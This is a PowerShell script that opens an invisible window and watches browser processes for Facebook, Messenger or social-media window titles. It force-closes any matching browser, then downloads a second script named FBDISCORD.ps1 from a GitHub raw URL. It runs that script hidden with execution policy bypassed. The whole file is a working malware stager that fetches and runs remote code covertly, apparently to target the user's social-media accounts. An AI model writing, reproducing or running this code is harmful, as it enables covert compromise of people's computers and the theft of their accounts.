Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase

# Define XAML for the invisible window
$xamlHiddenWindow = @'
<Window
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="HiddenWindow" Height="1" Width="1" WindowStartupLocation="CenterScreen" Visibility="Visible" Opacity="0">
</Window>
'@

# Load the XAML and create an invisible window object
$reader = (New-Object System.Xml.XmlNodeReader $xamlHiddenWindow)
$hiddenWindow = [Windows.Markup.XamlLoader]::Load($reader)

# Show the invisible window briefly
$hiddenWindow.Show()
Start-Sleep -Seconds 1  # Adjust the sleep duration as needed
$hiddenWindow.Close()

# Define a list of partial titles you want to monitor
$targetTitles = @("Facebook", "Messenger", "Social Media")

# Define a list of popular browser process names
$browserProcesses = @("chrome", "firefox", "msedge", "opera")

# Define the interval to check (in seconds)
$checkInterval = 15

# Variable to track whether a condition has been met
$conditionMet = $false

# Loop until any condition is met
while (-not $conditionMet) {
    foreach ($browserName in $browserProcesses) {
        $currentBrowserProcesses = Get-Process -name $browserName -ErrorAction SilentlyContinue
        if ($currentBrowserProcesses) {
            foreach ($process in $currentBrowserProcesses) {
                try {
                    $processTitle = $process.MainWindowTitle

                    $matchingTitles = @()
                    foreach ($targetTitle in $targetTitles) {
                        if ($processTitle -like "*$targetTitle*") {
                            $matchingTitles += $targetTitle
                            Stop-Process -Id $process.Id -Force
                            $conditionMet = $true  # Set the flag to true when any condition is met
                        }
                    }
                } catch {
                    # Error handling code can be added here, but it won't display in the console
                }
            }
        }
    }

    if (-not $conditionMet) {
        Start-Sleep -Seconds $checkInterval
    }
}

# After the condition is met, download and execute your second script from GitHub
if ($conditionMet) {
    $secondScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/FBDISCORD.ps1"
    $secondScript = Invoke-WebRequest -Uri $secondScriptUrl

    $scriptPath = "$env:TEMP\secondScript.ps1"
    $secondScript.Content | Out-File -FilePath $scriptPath -Encoding UTF8

    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $scriptPath" -WindowStyle Hidden -Wait
}

exit
